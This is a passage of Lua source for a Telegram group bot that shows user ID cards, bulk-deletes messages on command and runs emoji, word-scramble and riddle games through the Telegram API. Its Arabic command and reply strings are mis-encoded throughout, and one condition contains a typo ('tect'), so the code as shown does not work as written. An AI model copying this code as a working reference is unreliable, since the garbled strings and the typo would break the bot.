"Ψ§ΩΩΨ§ Ψ¨ΩΨ³ΩΩ ΨΉΩΩΩ ΩΨ¨Ψ΄Ω",
"Ψ§Ψ­ΩΨ§ ΩΨ³Ψ§ ΨΉΩΩΩ ΩΨ§Ψ¨Ψ§",
"ΩΨ΄ ΩΩΩΩΩ ΨΉΩΩΩ",
"Ψ΅ΩΨ±Ω ΩΩΩΨ¨Ω ΩΨ―",
}
local Description = Texting[math.random(#Texting)]
local get_id = database:get(bot_id.."Tshake:Klesh:Id:Bot"..msg.chat_id_) or database:get(bot_id.."Tshake:KleshIDALLBOT")
if not database:get(bot_id..'Tshake:Lock:ID:Bot:Photo'..msg.chat_id_) then
if taha.photos_[0] then
if get_id then
local get_id = get_id:gsub('#AddMem',Add_Mem) 
local get_id = get_id:gsub('#id',Id) 
local get_id = get_id:gsub('#username',UserName_User) 
local get_id = get_id:gsub('#msgs',NumMsg) 
local get_id = get_id:gsub('#edit',message_edit) 
local get_id = get_id:gsub('#stast',Status_Gps) 
local get_id = get_id:gsub('#auto',TotalMsg) 
local get_id = get_id:gsub('#Description',Description) 
local get_id = get_id:gsub('#game',Num_Games) 
local get_id = get_id:gsub('#photos',Total_Photp) 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(get_id)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id) 
else
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'English', callback_data=msg.sender_user_id_.."/ideengphoto"},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=msg.sender_user_id_.."/idearpphoto"},
},
}
local msg_id = msg.id_/2097152/0.5
local texte = 'βΉ |'..Description..'\nβΉ |Ψ§ΩΨ―ΩΩ  . '..Id..'\nβΉ | ΩΨΉΨ±ΩΩ  . '..UserName_User..'\nβΉ |Ψ±ΨͺΨ¨ΨͺΩ  . '..Status_Gps..'\nβΉ | Ψ±Ψ³Ψ§Ψ¦ΩΩ  . '..NumMsg..' \nβΉ | Ψ§ΩΨ¨Ψ§ΩΩ  . '..getbioY..' \nβΉ | Ψ§ΩΨͺΩΨ§ΨΉΩ . '..TotalMsg..'\nβΉ |Ψ§ΩΨ§ΩΨΉΨ§Ψ¨  . '..Num_Games
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(texte)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
else
local texte = '\n*βΉ |Ψ§ΩΨ―ΩΩ  . '..Id..'\nβΉ | ΩΨΉΨ±ΩΩ  .* ['..UserName_User..']*\nβΉ |Ψ±ΨͺΨ¨ΨͺΩ  . '..Status_Gps..'\nβΉ | Ψ±Ψ³Ψ§Ψ¦ΩΩ  . '..NumMsg..' \nβΉ | Ψ±Ψ³Ψ§Ψ¦ΩΩ  . '..NumMsg..' \nβΉ | Ψ§ΩΨͺΩΨ§ΨΉΩ . '..TotalMsg..'\nβΉ |Ψ§ΩΨ§ΩΨΉΨ§Ψ¨  . '..Num_Games..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'English', callback_data=msg.sender_user_id_.."/ideeng"},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=msg.sender_user_id_.."/idearp"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
else
if get_id then
local get_id = get_id:gsub('#AddMem',Add_Mem) 
local get_id = get_id:gsub('#id',Id) 
local get_id = get_id:gsub('#username',UserName_User) 
local get_id = get_id:gsub('#msgs',NumMsg) 
local get_id = get_id:gsub('#edit',message_edit) 
local get_id = get_id:gsub('#stast',Status_Gps) 
local get_id = get_id:gsub('#auto',TotalMsg) 
local get_id = get_id:gsub('#Description',Description) 
local get_id = get_id:gsub('#game',Num_Games) 
local get_id = get_id:gsub('#photos',Total_Photp) 
local texte = '['..get_id..']'
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown")
else
local texte = '\n*βΉ |Ψ§ΩΨ―ΩΩ  . '..Id..'\nβΉ | ΩΨΉΨ±ΩΩ  .* ['..UserName_User..']*\nβΉ |Ψ±ΨͺΨ¨ΨͺΩ  . '..Status_Gps..'\nβΉ | Ψ±Ψ³Ψ§Ψ¦ΩΩ  . '..NumMsg..' \nβΉ | Ψ±Ψ³Ψ§Ψ¦ΩΩ  . '..NumMsg..' \nβΉ | Ψ§ΩΨͺΩΨ§ΨΉΩ . '..TotalMsg..'\nβΉ |Ψ§ΩΨ§ΩΨΉΨ§Ψ¨  . '..Num_Games..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'English', callback_data=msg.sender_user_id_.."/ideeng"},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=msg.sender_user_id_.."/idearp"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end,nil)   
end,nil)   
end,nil)   
end
end
if text == 'ΩΨͺΨ­ Ψ§ΩΩΨ³Ψ­' and Owner(msg) then   
database:del(bot_id..'lock:del'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'ββΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨ³Ψ­') 
end
if text == 'ΩΩΩ Ψ§ΩΩΨ³Ψ­' and Owner(msg) then  
database:set(bot_id..'lock:del'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'ββΏΨͺΩ ΩΩΩ Ψ§ΩΩΨ³Ψ­') 
end
if text and text:match('^ΩΨ³Ψ­ (%d+)$') and Addictive(msg) and not database:get(bot_id..'lock:del'..msg.chat_id_) then    
local Number = tonumber(text:match('^ΩΨ³Ψ­ (%d+)$')) 
if Number > 1000 then 
send(msg.chat_id_, msg.id_,'π βΏΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ ΩΨ³Ψ­ Ψ§ΩΨ«Ψ± ΩΩ *~ 1000* Ψ±Ψ³Ψ§ΩΩ') 
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576
end
send(msg.chat_id_, msg.id_,'πβΏΨͺΩ ΩΨ³Ψ­ *~ '..Number..'* Ψ±Ψ³Ψ§ΩΩ .')  
end


if text == 'Ψ§ΩΨ―Ω' and tonumber(msg.reply_to_message_id_) > 0 and not database:get(bot_id..'Tshake:Lock:ID:Bot'..msg.chat_id_) then
function Function_Tshake(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.first_name_ == false then
send(msg.chat_id_, msg.id_,'π€βΏ Ψ§ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ ΩΨ§ ΨͺΩΨ¬Ψ― ΩΨΉΩΩΩΨ§ΨͺΩ ')
return false
end
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = data.id_
local NumMsg = database:get(bot_id..'Tshake:messageUser'..msg.chat_id_..':'..data.id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..msg.chat_id_..data.id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Msg_User"..msg.chat_id_..":"..data.id_) or 0
local Add_Mem = database:get(bot_id.."Tshake:Add:Memp"..msg.chat_id_..":"..data.id_) or 0
local texte = '\n*βΉ |Ψ§ΩΨ―ΩΩ  . '..Id..'\nβΉ | ΩΨΉΨ±ΩΩ  .* ['..UserName_User..']*\nβΉ |Ψ±ΨͺΨ¨ΨͺΩ  . '..Status_Gps..'\nβΉ | Ψ±Ψ³Ψ§Ψ¦ΩΩ  . '..NumMsg..' \nβΉ | Ψ§ΩΨͺΩΨ§ΨΉΩ . '..TotalMsg..'\nβΉ |Ψ§ΩΨ§ΩΨΉΨ§Ψ¨  . '..Num_Games..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'English', callback_data=msg.sender_user_id_.."/ideeng1@"..Id},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=msg.sender_user_id_.."/idearp1@"..Id},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ§ΩΨ―Ω @(.*)$") and not database:get(bot_id..'Tshake:Lock:ID:Bot'..msg.chat_id_) then
local username = text:match("^Ψ§ΩΨ―Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = data.id_
local NumMsg = database:get(bot_id..'Tshake:messageUser'..msg.chat_id_..':'..data.id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..msg.chat_id_..data.id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Msg_User"..msg.chat_id_..":"..data.id_) or 0
local Add_Mem = database:get(bot_id.."Tshake:Add:Memp"..msg.chat_id_..":"..data.id_) or 0
local texte = '\n*βΉ |Ψ§ΩΨ―ΩΩ  . '..Id..'\nβΉ | ΩΨΉΨ±ΩΩ  .* ['..UserName_User..']*\nβΉ |Ψ±ΨͺΨ¨ΨͺΩ  . '..Status_Gps..'\nβΉ | Ψ±Ψ³Ψ§Ψ¦ΩΩ  . '..NumMsg..' \nβΉ | Ψ§ΩΨͺΩΨ§ΨΉΩ . '..TotalMsg..'\nβΉ |Ψ§ΩΨ§ΩΨΉΨ§Ψ¨  . '..Num_Games..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'English', callback_data=msg.sender_user_id_.."/ideeng1@"..Id},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=msg.sender_user_id_.."/idearp1@"..Id},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
else
send(msg.chat_id_, msg.id_,'π€βΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text == "Ψ³ΩΨ§ΩΩΨ§Ψͺ" or text == "Ψ³ΩΨ§ΩΩ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Set:Sma"..msg.chat_id_)
Random = {"π","π","π","π","π","π","π","π","π","π","π","π","π₯₯","π₯","π","π","π₯","π₯¦","π₯","πΆ","π½","π₯","π₯","π₯","π₯","π","π₯¨","π","π§","π₯","π³","π₯","π₯©","π","π","π­","π","π ","π","π₯ͺ","π₯","βοΈ","π΅","π₯€","πΆ","πΊ","π»","π","β½οΈ","π","βΎοΈ","πΎ","π","π","π±","π","πΈ","π₯","π°","π?","π³","π―","π²","π»","πΈ","πΊ","π₯","πΉ","πΌ","π§","π€","π¬","π¨","π­","πͺ","π","π«","π¨","π΅","π","π","π₯","π·","π","π","π","π","π","π","π","π","π?πΆ","β","π‘","π?","π‘","π£","π","π","π","π","π","π","πͺ","β«οΈ","π","π­","β°","πΊ","π","βοΈ","π‘"}
SM = Random[math.random(#Random)]
database:set(bot_id.."Tshak:Random:Sm"..msg.chat_id_,SM)
send(msg.chat_id_, msg.id_,"π‘βΏΨ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ¨ΨΉΨͺ ΩΨ§Ψ°Ψ§ Ψ§ΩΨ³ΩΨ§ΩΩ ? ~ {`"..SM.."`}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Random:Sm"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Set:Sma"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Set:Sma"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"πβΏΨ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nβ»βΏΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ³ΩΨ§ΩΩ , Ψ³ΩΨ§ΩΩΨ§Ψͺ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Tshak:Set:Sma"..msg.chat_id_,true)
return false
end 
if text == "Ψ§ΩΨ§Ψ³Ψ±ΨΉ" or tect == "ΨͺΨ±ΨͺΩΨ¨" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Speed:Tr"..msg.chat_id_)
KlamSpeed = {"Ψ³Ψ­ΩΨ±","Ψ³ΩΨ§Ψ±Ω","Ψ§Ψ³ΨͺΩΨ¨Ψ§Ω","ΩΩΩΩ","Ψ§ΩΩΩΩ","Ψ¨Ψ²ΩΩΩ","ΩΨ·Ψ¨Ψ?","ΩΨ±Ψ³ΨͺΩΨ§ΩΩ","Ψ―Ψ¬Ψ§Ψ¬Ω","ΩΨ―Ψ±Ψ³Ω","Ψ§ΩΩΨ§Ω","ΨΊΨ±ΩΩ","Ψ«ΩΨ§Ψ¬Ω","ΩΩΩΩ","Ψ³ΩΩΩΩ","Ψ§ΩΨΉΨ±Ψ§Ω","ΩΨ­Ψ·Ω","Ψ·ΩΨ§Ψ±Ω","Ψ±Ψ§Ψ―Ψ§Ψ±","ΩΩΨ²Ω","ΩΨ³ΨͺΨ΄ΩΩ","ΩΩΨ±Ψ¨Ψ§Ψ‘","ΨͺΩΨ§Ψ­Ω","Ψ§Ψ?Ψ·Ψ¨ΩΨ·","Ψ³ΩΩΩΩ","ΩΨ±ΩΨ³Ψ§","Ψ¨Ψ±ΨͺΩΨ§ΩΩ","ΨͺΩΨ§Ψ­","ΩΨ·Ψ±ΩΩ","Ψ¨ΨͺΩΨͺΩ","ΩΩΨ§ΩΩ","Ψ΄Ψ¨Ψ§Ω","Ψ¨Ψ§Ψ΅","Ψ³ΩΩΩ","Ψ°Ψ¨Ψ§Ψ¨","ΨͺΩΩΨ§Ψ²","Ψ­Ψ§Ψ³ΩΨ¨","Ψ§ΩΨͺΨ±ΩΩΨͺ","Ψ³Ψ§Ψ­Ω","Ψ¬Ψ³Ψ±"};
name = KlamSpeed[math.random(#KlamSpeed)]
database:set(bot_id.."Tshak:Klam:Speed"..msg.chat_id_,name)
name = string.gsub(name,"Ψ³Ψ­ΩΨ±","Ψ³ Ψ± Ω Ψ­")
name = string.gsub(name,"Ψ³ΩΨ§Ψ±Ω","Ω Ψ± Ψ³ Ω Ψ§")
name = string.gsub(name,"Ψ§Ψ³ΨͺΩΨ¨Ψ§Ω","Ω Ψ¨ Ψ§ Ψͺ Ω Ψ³ Ψ§")
name = string.gsub(name,"ΩΩΩΩ","Ω Ω Ω Ω")
name = string.gsub(name,"Ψ§ΩΩΩΩ","Ω Ω Ω Ψ§")
name = string.gsub(name,"Ψ¨Ψ²ΩΩΩ","Ψ² Ω Ω Ω")
name = string.gsub(name,"ΩΨ·Ψ¨Ψ?","Ψ? Ψ¨ Ψ· Ω")
name = string.gsub(name,"ΩΨ±Ψ³ΨͺΩΨ§ΩΩ","Ψ³ Ψͺ Ψ§ Ω Ω Ω Ψ± Ω")
name = string.gsub(name,"Ψ―Ψ¬Ψ§Ψ¬Ω","Ψ¬ Ψ¬ Ψ§ Ψ― Ω")
name = string.gsub(name,"ΩΨ―Ψ±Ψ³Ω","Ω Ω Ψ― Ψ± Ψ³")
name = string.gsub(name,"Ψ§ΩΩΨ§Ω","Ω Ψ§ Ω Ψ§ Ω")
name = string.gsub(name,"ΨΊΨ±ΩΩ","ΨΊ Ω Ψ± Ω")
name = string.gsub(name,"Ψ«ΩΨ§Ψ¬Ω","Ψ¬ Ω Ψͺ Ω Ψ§")
name = string.gsub(name,"ΩΩΩΩ","Ω Ω Ω Ω")
name = string.gsub(name,"Ψ³ΩΩΩΩ","Ω Ω Ω Ω Ψ³")
name = string.gsub(name,"Ψ§ΩΨΉΨ±Ψ§Ω","Ω ΨΉ Ψ§ Ω Ψ± Ψ§")
name = string.gsub(name,"ΩΨ­Ψ·Ω","Ω Ψ· Ω Ψ­")
name = string.gsub(name,"Ψ·ΩΨ§Ψ±Ω","Ψ± Ψ§ Ψ· Ω Ω")
name = string.gsub(name,"Ψ±Ψ§Ψ―Ψ§Ψ±","Ψ± Ψ§ Ψ± Ψ§ Ψ―")
name = string.gsub(name,"ΩΩΨ²Ω","Ω Ψ² Ω Ω")
name = string.gsub(name,"ΩΨ³ΨͺΨ΄ΩΩ","Ω Ψ΄ Ψ³ Ω Ψͺ Ω")
name = string.gsub(name,"ΩΩΨ±Ψ¨Ψ§Ψ‘","Ψ± Ψ¨ Ω Ω Ψ§ Ψ‘")
name = string.gsub(name,"ΨͺΩΨ§Ψ­Ω","Ψ­ Ω Ψ§ Ψͺ Ω")
name = string.gsub(name,"Ψ§Ψ?Ψ·Ψ¨ΩΨ·","Ψ· Ψ¨ Ω Ψ§ Ψ? Ψ·")
name = string.gsub(name,"Ψ³ΩΩΩΩ","Ω Ω Ω Ω Ψ³")
name = string.gsub(name,"ΩΨ±ΩΨ³Ψ§","Ω Ω Ψ± Ψ³ Ψ§")
name = string.gsub(name,"Ψ¨Ψ±ΨͺΩΨ§ΩΩ","Ψ± Ψͺ Ω Ψ¨ Ψ§ Ω Ω")
name = string.gsub(name,"ΨͺΩΨ§Ψ­","Ψ­ Ω Ψ§ Ψͺ")
name = string.gsub(name,"ΩΨ·Ψ±ΩΩ","Ω Ψ· Ω Ψ± Ω")
name = string.gsub(name,"Ψ¨ΨͺΩΨͺΩ","Ψ¨ Ψͺ Ψͺ Ω Ω")
name = string.gsub(name,"ΩΩΨ§ΩΩ","Ω Ω Ω Ω Ω")
name = string.gsub(name,"Ψ΄Ψ¨Ψ§Ω","Ψ¨ Ψ΄ Ψ§ Ω")
name = string.gsub(name,"Ψ¨Ψ§Ψ΅","Ψ΅ Ψ§ Ψ¨")
name = string.gsub(name,"Ψ³ΩΩΩ","Ω Ψ³ Ω Ω")
name = string.gsub(name,"Ψ°Ψ¨Ψ§Ψ¨","Ψ¨ Ψ§ Ψ¨ Ψ°")
name = string.gsub(name,"ΨͺΩΩΨ§Ψ²","Ψͺ Ω Ω Ψ² Ψ§")
name = string.gsub(name,"Ψ­Ψ§Ψ³ΩΨ¨","Ψ³ Ψ§ Ψ­ Ω Ψ¨")
name = string.gsub(name,"Ψ§ΩΨͺΨ±ΩΩΨͺ","Ψ§ Ψͺ Ω Ψ± Ω Ω Ψͺ")
name = string.gsub(name,"Ψ³Ψ§Ψ­Ω","Ψ­ Ψ§ Ω Ψ³")
name = string.gsub(name,"Ψ¬Ψ³Ψ±","Ψ± Ψ¬ Ψ³")
send(msg.chat_id_, msg.id_,"π‘βΏΨ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ±ΨͺΨ¨ΩΨ§ ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Klam:Speed"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Speed:Tr"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Speed:Tr"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"πβΏΨ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nβ»βΏΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΩΨ§Ψ³Ψ±ΨΉ , ΨͺΨ±ΨͺΩΨ¨ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Tshak:Speed:Tr"..msg.chat_id_,true)
end 

if text == "Ψ§ΩΨ§Ψ³Ψ¦ΩΩ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Set:Hzora"..msg.chat_id_)
Hzora = {"Ψ§ΩΨ¬Ψ±Ψ³","ΨΉΩΨ±Ψ¨ Ψ§ΩΨ³Ψ§ΨΉΩ","Ψ§ΩΨ³ΩΩ","Ψ§ΩΩΨ·Ψ±","5","Ψ§ΩΩΨͺΨ§Ψ¨","Ψ§ΩΨ¨Ψ³ΩΨ§Ψ±","7","Ψ§ΩΩΨΉΨ¨Ω","Ψ¨ΩΨͺ Ψ§ΩΨ΄ΨΉΨ±","ΩΩΨ§ΩΩ","Ψ§ΩΨ§","Ψ§ΩΩ","Ψ§ΩΨ§Ψ¨Ψ±Ω","Ψ§ΩΨ³Ψ§ΨΉΩ","22","ΨΊΩΨ·","ΩΩ Ψ§ΩΨ³Ψ§ΨΉΩ","Ψ§ΩΨ¨ΩΨͺΩΨ¬Ψ§Ω","Ψ§ΩΨ¨ΩΨΆ","Ψ§ΩΩΨ±Ψ§ΩΩ","Ψ§ΩΨΆΩΨ‘","Ψ§ΩΩΩΨ§Ψ‘","Ψ§ΩΨΆΩ","Ψ§ΩΨΉΩΨ±","Ψ§ΩΩΩΩ","Ψ§ΩΩΨ΄Ψ·","Ψ§ΩΨ­ΩΨ±Ω","Ψ§ΩΨ¨Ψ­Ψ±","Ψ§ΩΨ«ΩΨ¬","Ψ§ΩΨ§Ψ³ΩΩΨ¬","Ψ§ΩΨ΅ΩΨͺ","Ψ¨ΩΩ"};
name = Hzora[math.random(#Hzora)]
database:set(bot_id.."Tshak:Klam:Hzor"..msg.chat_id_,name)
name = string.gsub(name,"Ψ§ΩΨ¬Ψ±Ψ³","Ψ΄ΩΨ¦ Ψ§Ψ°Ψ§ ΩΩΨ³ΨͺΩ Ψ΅Ψ±Ψ? ΩΨ§ ΩΩΩ Ψ")
name = string.gsub(name,"ΨΉΩΨ±Ψ¨ Ψ§ΩΨ³Ψ§ΨΉΩ","Ψ§Ψ?ΩΨ§Ω ΩΨ§ ΩΨ³ΨͺΨ·ΩΨΉΨ§Ω ΨͺΩΨΆΩΩ Ψ§ΩΨ«Ψ± ΩΩ Ψ―ΩΩΩΩ ΩΨΉΨ§ ΩΩΨ§ ΩΩΨ§ Ψ")
name = string.gsub(name,"Ψ§ΩΨ³ΩΩ","ΩΨ§ ΩΩ Ψ§ΩΨ­ΩΩΨ§Ω Ψ§ΩΨ°Ω ΩΩ ΩΨ΅ΨΉΨ― Ψ§ΩΩ Ψ³ΩΩΩΨ© ΩΩΨ­ ΨΉΩΩΩ Ψ§ΩΨ³ΩΨ§Ω Ψ")
name = string.gsub(name,"Ψ§ΩΩΨ·Ψ±","Ψ΄ΩΨ¦ ΩΨ³ΩΨ· ΨΉΩΩ Ψ±Ψ£Ψ³Ω ΩΩ Ψ§ΩΨ§ΨΉΩΩ ΩΩΨ§ ΩΨ¬Ψ±Ψ­Ω ΩΩΨ§ ΩΩ Ψ")
name = string.gsub(name,"5","ΩΨ§ Ψ§ΩΨΉΨ―Ψ― Ψ§ΩΨ°Ω Ψ§Ψ°Ψ§ ΨΆΨ±Ψ¨ΨͺΩ Ψ¨ΩΩΨ³Ω ΩΨ§ΨΆΩΨͺ ΨΉΩΩΩ 5 ΩΨ΅Ψ¨Ψ­ Ψ«ΩΨ§Ψ«ΩΩ ")
name = string.gsub(name,"Ψ§ΩΩΨͺΨ§Ψ¨","ΩΨ§ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩ Ψ§ΩΨ±Ψ§Ω ΩΩΩΨ³ ΩΩ Ψ¬Ψ°ΩΨ± Ψ")
name = string.gsub(name,"Ψ§ΩΨ¨Ψ³ΩΨ§Ψ±","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ§ ΩΩΨ΄Ω Ψ§ΩΨ§ Ψ¨Ψ§ΩΨΆΨ±Ψ¨ Ψ")
name = string.gsub(name,"7","ΨΉΨ§Ψ¦ΩΩ ΩΨ€ΩΩΩ ΩΩ 6 Ψ¨ΩΨ§Ψͺ ΩΨ§Ψ? ΩΩΩ ΩΩΩΩ .ΩΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ§Ψ― Ψ§ΩΨΉΨ§Ψ¦ΩΩ ")
name = string.gsub(name,"Ψ§ΩΩΨΉΨ¨Ω","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΩΩΨ¬ΩΨ― ΩΨ³Ψ· ΩΩΨ© Ψ")
name = string.gsub(name,"Ψ¨ΩΨͺ Ψ§ΩΨ΄ΨΉΨ±","ΩΨ§ ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ°Ω ΩΩΨ³ ΩΩΩ Ψ§Ψ¨ΩΨ§Ψ¨ ΩΩΨ§ ΩΩΨ§ΩΨ° Ψ ")
name = string.gsub(name,"ΩΩΨ§ΩΩ","ΩΨ­Ψ―Ω Ψ­ΩΩΩ ΩΩΨΊΨ±ΩΨ±Ω ΨͺΩΨ¨Ψ³ ΩΩΨ© ΨͺΩΩΨ±Ω .ΩΩ ΩΩΩ Ψ ")
name = string.gsub(name,"Ψ§ΩΨ§","Ψ§Ψ¨Ω Ψ§ΩΩ ΩΨ§Ψ¨Ω Ψ§Ψ¨ΩΩ ΩΩΩΨ³ Ψ¨Ψ§Ψ?ΨͺΩ ΩΩΨ§ Ψ¨Ψ§Ψ?ΩΩ ΩΩΩ ΩΩΩΩ Ψ")
name = string.gsub(name,"Ψ§ΩΩ","Ψ§Ψ?Ψͺ Ψ?Ψ§ΩΩ ΩΩΩΨ³Ψͺ Ψ?Ψ§ΩΨͺΩ ΩΩ ΨͺΩΩΩ Ψ ")
name = string.gsub(name,"Ψ§ΩΨ§Ψ¨Ψ±Ω","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΩΨ§ Ψ?Ψ·Ψ§ Ψ?Ψ·ΩΩ ΩΩΨ― Ψ΄ΩΨ¦Ψ§ ΩΩ Ψ°ΩΩΩ Ψ ")
name = string.gsub(name,"Ψ§ΩΨ³Ψ§ΨΉΩ","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΩΩ Ψ§ΩΨ΅Ψ―Ω ΩΩΩΩΩ Ψ§Ψ°Ψ§ Ψ¬Ψ§ΨΉ ΩΨ°Ψ¨ Ψ")
name = string.gsub(name,"22","ΩΩ ΩΨ±Ω ΩΩΨ·Ψ¨Ω ΨΉΩΨ±Ψ¨Ψ§ Ψ§ΩΨ³Ψ§ΨΉΩ ΨΉΩΩ Ψ¨ΨΉΨΆΩΩΨ§ ΩΩ Ψ§ΩΩΩΩ Ψ§ΩΩΨ§Ψ­Ψ― ")
name = string.gsub(name,"ΨΊΩΨ·","ΩΨ§ ΩΩ Ψ§ΩΩΩΩΩ Ψ§ΩΩΨ­ΩΨ―Ω Ψ§ΩΨͺΩ ΨͺΩΩΨΆ ΨΊΩΨ· Ψ―Ψ§Ψ¦ΩΨ§ Ψ ")
name = string.gsub(name,"ΩΩ Ψ§ΩΨ³Ψ§ΨΉΩ","ΩΨ§ ΩΩ Ψ§ΩΨ³Ψ€Ψ§Ω Ψ§ΩΨ°Ω ΨͺΨ?ΨͺΩΩ Ψ§Ψ¬Ψ§Ψ¨ΨͺΩ Ψ―Ψ§Ψ¦ΩΨ§ Ψ")
name = string.gsub(name,"Ψ§ΩΨ¨ΩΨͺΩΨ¬Ψ§Ω","Ψ¬Ψ³Ω Ψ§Ψ³ΩΨ― ΩΩΩΨ¨ Ψ§Ψ¨ΩΨΆ ΩΨ±Ψ§Ψ³ Ψ§Ψ?ΨΈΨ± ΩΩΨ§ ΩΩ Ψ")
name = string.gsub(name,"Ψ§ΩΨ¨ΩΨΆ","ΩΨ§ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω Ψ§Ψ³ΩΩ ΨΉΩΩ ΩΩΩΩ Ψ")
